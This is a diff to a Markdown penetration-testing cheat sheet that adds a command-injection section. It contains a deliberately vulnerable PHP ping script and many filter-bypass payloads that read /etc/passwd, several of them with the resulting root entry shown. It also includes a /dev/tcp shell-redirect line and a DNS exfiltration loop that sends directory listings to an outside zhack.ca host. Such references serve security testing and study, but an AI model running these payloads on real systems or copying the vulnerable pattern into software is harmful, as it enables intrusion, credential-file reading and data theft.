@@ -1197,12 +1197,39 @@ ruby sub_brust.rb --fast nokia.com
 ### Tool:
 - [Commix](https://github.com/commixproject/commix)
 
+Example of Command Injection with PHP:
+Suppose you have a PHP script that takes a user input to ping a specified IP address or domain:
+```
+<?php
+    $ip = $_GET['ip'];
+    system("ping -c 4 " . $ip);
+?>
+```
 ### Identification:
 Find an input field that interacts with the operating system shell. Try executing system shell commands using delimiters.
 
 **Example:**
 ```bash
 ping -c 5 127.0.0.1
+```
+
+### Chaining Commands
+
+In many command-line interfaces, especially Unix-like systems, there are several characters that can be used to chain or manipulate commands. 
+
+
+* `;` (Semicolon): Allows you to execute multiple commands sequentially.
+* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
+* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
+* `&` (Background): Execute the command in the background, allowing the user to continue using the shell.
+* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second command.
+
+```powershell
+command1; command2   # Execute command1 and then command2
+command1 && command2 # Execute command2 only if command1 succeeds
+command1 || command2 # Execute command2 only if command1 fails
+command1 & command2  # Execute command1 in the background
+command1 | command2  # Pipe the output of command1 into command2
 ```
 
 **Possible Parameters:**
@@ -1260,6 +1287,210 @@ w\ho\am\i  # Backslash bypass
 who$@ami  # Using $@
 echo $0   # Identifying shell
 ```
+## Filter Bypasses
+
+### Bypass Without Space
+
+* `$IFS` is a special shell variable called the Internal Field Separator. By default, in many shells, it contains whitespace characters (space, tab, newline). When used in a command, the shell will interpret `$IFS` as a space. `$IFS` does not directly work as a separator in commands like `ls`, `wget`; use `${IFS}` instead. 
+  ```powershell
+  cat${IFS}/etc/passwd
+  ls${IFS}-la
+  ```
+* In some shells, brace expansion generates arbitrary strings. When executed, the shell will treat the items inside the braces as separate commands or arguments.
+  ```powershell
+  {cat,/etc/passwd}
+  ```
+* Input redirection. The < character tells the shell to read the contents of the file specified. 
+  ```powershell
+  cat</etc/passwd
+  sh</dev/tcp/127.0.0.1/4242
+  ```
+* ANSI-C Quoting 
+  ```powershell
+  X=$'uname\x20-a'&&$X
+  ```
+* The tab character can sometimes be used as an alternative to spaces. In ASCII, the tab character is represented by the hexadecimal value `09`.
+  ```powershell
+  ;ls%09-al%09/home
+  ```
+* In Windows, `%VARIABLE:~start,length%` is a syntax used for substring operations on environment variables.
+  ```powershell
+  ping%CommonProgramFiles:~10,-18%127.0.0.1
+  ping%PROGRAMFILES:~10,-5%127.0.0.1
+  ```
+
+
+### Bypass With A Line Return
+
+Commands can also be run in sequence with newlines
+
+```bash
+original_cmd_by_server
+ls
+```
+
+
+### Bypass With Backslash Newline
+
+* Commands can be broken into parts by using backslash followed by a newline
+  ```powershell
+  $ cat /et\
+  c/pa\
+  sswd
+  ```
+* URL encoded form would look like this:
+  ```powershell
+  cat%20/et%5C%0Ac/pa%5C%0Asswd
+  ```
+
+
+### Bypass With Tilde Expansion
+
+```powershell
+echo ~+
+echo ~-
+```
+
+### Bypass With Brace Expansion
+
+```powershell
+{,ip,a}
+{,ifconfig}
+{,ifconfig,eth0}
+{l,-lh}s
+{,echo,#test}
+{,$"whoami",}
+{,/?s?/?i?/c?t,/e??/p??s??,}
+```
+
+
+### Bypass Characters Filter
+
+Commands execution without backslash and slash - linux bash
+
+```powershell
+swissky@crashlab:~$ echo ${HOME:0:1}
+/
+
+swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ echo . | tr '!-0' '"-1'
+/
+
+swissky@crashlab:~$ tr '!-0' '"-1' <<< .
+/
+
+swissky@crashlab:~$ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+root:x:0:0:root:/root:/bin/bash
+```
+
+### Bypass Characters Filter Via Hex Encoding
+
+```powershell
+swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+/etc/passwd
+
+swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764
+/etc/passwd
+
+swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)
+/etc/passwd
+
+swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+root:x:0:0:root:/root:/bin/bash
+```
+
+### Bypass With Single Quote
+
+```powershell
+w'h'o'am'i
+wh''oami
+'w'hoami
+```
+
+### Bypass With Double Quote
+
+```powershell
+w"h"o"am"i
+wh""oami
+"wh"oami
+```
+
+### Bypass With Backticks
+
+```powershell
+wh``oami
+```
+
+### Bypass With Backslash and Slash
+
+```powershell
+w\ho\am\i
+/\b\i\n/////s\h
+```
+
+### Bypass With $@
+
+`$0`: Refers to the name of the script if it's being run as a script. If you're in an interactive shell session, `$0` will typically give the name of the shell.
+
+```powershell
+who$@ami
+echo whoami|$0
+```
+
+
+### Bypass With $()
+
+```powershell
+who$()ami
+who$(echo am)i
+who`echo am`i
+```
+
+### Bypass With Variable Expansion
+
+```powershell
+/???/??t /???/p??s??
+
+test=/ehhh/hmtc/pahhh/hmsswd
+cat ${test//hhh\/hm/}
+cat ${test//hh??hm/}
+```
+
+### Bypass With Wildcards
+
+```powershell
+powershell C:\*\*2\n??e*d.*? # notepad
+@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
+```
+### Dns Based Data Exfiltration
+
+Based on the tool from [HoLyVieR/dnsbin](https://github.com/HoLyVieR/dnsbin), also hosted at [dnsbin.zhack.ca](http://dnsbin.zhack.ca/)
+
+1. Go to http://dnsbin.zhack.ca/
+2. Execute a simple 'ls'
+  ```powershell
+  for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
+  ```
+
+Online tools to check for DNS based data exfiltration:
+
+- http://dnsbin.zhack.ca/
+- https://app.interactsh.com/
+- Burp Collaborator
 
 ---
 Click-Jacking
